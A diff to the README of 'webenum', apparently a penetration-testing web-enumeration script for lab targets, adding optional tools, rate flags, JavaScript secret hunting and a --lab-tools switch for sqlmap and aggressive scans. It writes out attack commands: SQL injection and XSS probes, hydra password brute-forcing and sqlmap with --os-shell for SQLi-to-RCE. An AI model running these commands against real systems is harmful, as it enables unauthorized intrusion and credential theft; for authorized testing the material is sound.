@@ -26,12 +26,12 @@ sudo mv webenum.sh /usr/local/bin/webenum
 webenum --help
 
 # Install dependencies if missing
-sudo apt install ffuf whatweb curl python3 seclists
+sudo apt install ffuf whatweb curl python3 seclists jq httpx-toolkit sslscan wafw00f davtest cadaver
 ```
 
 **Required:** ffuf, curl, python3
-**Recommended:** whatweb (fingerprinting), seclists (better wordlists)
-**Graceful degradation:** Script continues if whatweb is missing. ffuf is the only hard requirement.
+**Recommended:** whatweb, httpx-toolkit, seclists, jq, sslscan, wafw00f, davtest, cadaver
+**Graceful degradation:** Script continues if optional tools are missing. ffuf is the only hard web-enum tool requirement.
 
 ### Wordlist Check
 
@@ -131,12 +131,14 @@ webenum --url http://192.168.50.100 --deep --vhost target.htb
 | `--deep` | Enable recursive fuzzing + parameter discovery | `--deep` |
 | `--vhost DOMAIN` | Enable vhost fuzzing | `--vhost target.htb` |
 | `--root DIR` | Custom output root (default: `$TOOLKIT_ROOT/web`) | `--root ~/pg` |
+| `--threads N` | ffuf thread count (default: 40) | `--threads 20` |
+| `--rate N` | Max requests/sec, 0=unlimited (default: 0) | `--rate 100` |
+| `--ffuf-ac` | Enable ffuf autocalibration after reviewing baseline behavior | `--ffuf-ac` |
+| `--lab-tools` | Include lab-only automation suggestions such as sqlmap, nuclei, and aggressive WPScan | `--lab-tools` |
+| `-h, --help` | Show help | |
 
 When launched through `sudo`, the default `$TOOLKIT_ROOT` resolves to the invoking
 user's home directory instead of `/root/offsec`.
-| `--threads N` | ffuf thread count (default: 40) | `--threads 20` |
-| `--rate N` | Max requests/sec, 0=unlimited (default: 0) | `--rate 100` |
-| `-h, --help` | Show help | |
 
 *`--url` or `--from-recon` required.
 
@@ -152,9 +154,13 @@ user's home directory instead of `/root/offsec`.
 |-------|-------------|------------------|
 | whatweb aggressive (-a 3) | `fingerprint/whatweb.txt` | CMS, language, framework, OS |
 | whatweb verbose | `fingerprint/whatweb_verbose.txt` | Plugin details, version strings |
+| httpx technology probe | `fingerprint/httpx.json` | Status, title, tech, server, redirects |
+| TLS certificate names | `fingerprint/tls_certificate.txt`, `fingerprint/tls_names.txt` | Hostname/vhost clues |
+| WAF fingerprint | `fingerprint/wafw00f.txt` | WAF/proxy hints |
 | HTTP headers (follows redirects) | `fingerprint/headers.txt` | Server, X-Powered-By, cookies, auth type |
 | Homepage source (first 500 lines) | `fingerprint/homepage_source.html` | Comments, hidden paths, JS files |
 | Source hint extraction | `fingerprint/source_hints.txt` | HTML comments, relative paths, emails, versions |
+| JavaScript review | `fingerprint/js_urls.txt`, `js_endpoints.txt`, `js_secret_hints.txt` | Client-side endpoints and credential-looking strings |
 | robots.txt | `fingerprint/robots.txt` | Disallowed paths = interesting paths |
 | sitemap.xml | `fingerprint/sitemap.xml` | Endpoint discovery |
 | security.txt | `fingerprint/security_txt.txt` | Contact info, scope hints |
@@ -218,12 +224,14 @@ Aggregates everything into `summary/summary.md` (structured report), `summary/su
 - **directory listing** — recursive `wget` and credential grep
 - **Laravel/.env indicators** — `.env` pull, `APP_KEY`/DB secret grep, Laravel CVE lookup
 - **debug framework indicators** — Werkzeug/Django/traceback probes
+- **TLS certificate names** — `/etc/hosts`, vhost fuzzing, and webenum re-run for real certificate SANs
+- **JavaScript endpoints/secrets** — commands to review fetched JS and endpoint/secret-hint files
 - **specific tech matches** — WordPress, Joomla, Drupal, Tomcat, Jenkins, phpMyAdmin, Adminer, Grafana, Webmin, JBoss/WildFly, Spring actuator, Elasticsearch
 - **exposed `.git`** — `git-dumper` and secret grep
 - **Swagger/OpenAPI** — `curl`/`jq` inspection and API object fuzzing
 - **API endpoints** — `curl`/`jq` inspection for discovered `/api` paths plus API object fuzzing
 - **POST login form evidence** — form extraction plus `hydra http-post-form` template when source indicates a real login form
-- **parameters** — `sqlmap` and quick XSS probe examples
+- **parameters** — manual SQLi/LFI/XSS probes by default; `sqlmap` is emitted only with `--lab-tools`
 - **parameter-name attack hints** — LFI/traversal, RFI, command injection, SQLi, and XSS probes only when discovered parameter names support those paths
 
 ---
@@ -235,10 +243,21 @@ $TOOLKIT_ROOT/web/<host>_<port>_<proto>/artifacts/web/
 ├── fingerprint/
 │   ├── whatweb.txt              # Tech stack identification
 │   ├── whatweb_verbose.txt      # Detailed plugin output
+│   ├── httpx.json               # Optional ProjectDiscovery httpx probe
+│   ├── sslscan.txt              # Optional TLS detail
+│   ├── tls_certificate.txt      # Optional certificate metadata
+│   ├── tls_names.txt            # Optional SAN hostname clues
+│   ├── wafw00f.txt              # Optional WAF fingerprint
 │   ├── headers.txt              # Full HTTP response headers
 │   ├── http_methods.txt         # OPTIONS response for risky method checks
 │   ├── homepage_source.html     # First 500 lines of homepage
 │   ├── source_hints.txt         # Comments, paths, emails, versions
+│   ├── js/                      # Fetched JavaScript assets
+│   ├── js_urls.txt              # JS URLs extracted from HTML
+│   ├── js_endpoints.txt         # Endpoint-looking strings found in JS
+│   ├── js_secret_hints.txt      # Secret-looking strings found in JS
+│   ├── js_source_maps.txt       # sourceMappingURL hints
+│   ├── burp_workflow.txt        # Target-specific manual workflow notes
 │   ├── robots.txt               # Disallowed paths
 │   ├── sitemap.xml              # Endpoint map
 │   ├── security_txt.txt         # Security contact info
@@ -353,7 +372,8 @@ http://10.10.10.5/admin               |    200 |     1234 |     56 |    12
 ### WordPress Detected
 ```bash
 # loot/next_steps.txt contains this command when WordPress is actually detected
-wpscan --url http://TARGET --enumerate ap,at,u --plugins-detection aggressive
+wpscan --url http://TARGET --enumerate u,p,t --plugins-detection passive
+# Add --lab-tools when you want aggressive WPScan commands in non-engagement labs.
 ```
 
 ### Login Page Found
@@ -373,8 +393,11 @@ hydra -L users.txt -P passwords.txt TARGET http-get /admin
 
 ### Parameter Found (--deep mode)
 ```bash
-# loot/next_steps.txt contains a sqlmap command for parameters found by Phase 5
-sqlmap -u "http://TARGET/page?id=1" --batch --level 3 --risk 2
+# Default output stays manual/evidence-driven:
+curl -sk "http://TARGET/page?id=1%27" | head -60
+curl -sk "http://TARGET/page?id=1%20or%201=1" | head -60
+curl -sk "http://TARGET/page?id=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+# Add --lab-tools when you want sqlmap suggestions in non-engagement labs.
 ```
 
 ### robots.txt Disallow Entries Found
@@ -396,7 +419,7 @@ curl -sk -o /dev/null -w '%{http_code} http://TARGET/admin-panel\n' 'http://TARG
 | Jenkins | Login/script console checks and targeted fuzzing |
 | phpMyAdmin | Login URL and hydra template |
 | Adminer | `adminer/` and `adminer.php` checks plus hydra template |
-| Grafana | Login/health checks and nuclei Grafana templates |
+| Grafana | Login/health checks; nuclei templates only with `--lab-tools` |
 | Webmin | Header/version checks, `searchsploit`, login hydra template |
 | JBoss/WildFly | `jmx-console`/`web-console` checks and management-path fuzzing |
 | Spring actuator | `/actuator`, `/actuator/env`, Spring Boot wordlist fuzzing |
@@ -557,7 +580,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
 # App-specific: tomcat:tomcat, manager:manager, pi:raspberry
 # Check the app version → searchsploit for default creds
 
-# SQLi in login field — try these manually before running sqlmap
+# SQLi in login field — try manually first
 admin'--
 admin'#
 ' OR '1'='1
@@ -576,13 +599,13 @@ curl -sk "http://IP/page.php?id=1'"          # single quote error
 curl -sk "http://IP/page.php?id=1 AND 1=1"  # should return same as ?id=1
 curl -sk "http://IP/page.php?id=1 AND 1=2"  # should return different/empty
 
-# Automated scan (run in background — can take time)
+# Lab-only automated scan (not emitted by default; use --lab-tools)
 sqlmap -u "http://IP/page.php?id=1" --batch --dbs --level 3 --risk 2
 
 # If POST form
 sqlmap -u "http://IP/login" --data "username=admin&password=pass" --batch --dbs
 
-# SQLi to RCE (if MySQL with FILE privilege or MSSQL with xp_cmdshell)
+# Lab-only SQLi-to-RCE checks (if MySQL with FILE privilege or MSSQL with xp_cmdshell)
 # MySQL
 sqlmap -u "http://IP/page.php?id=1" --batch --os-shell
 # MSSQL
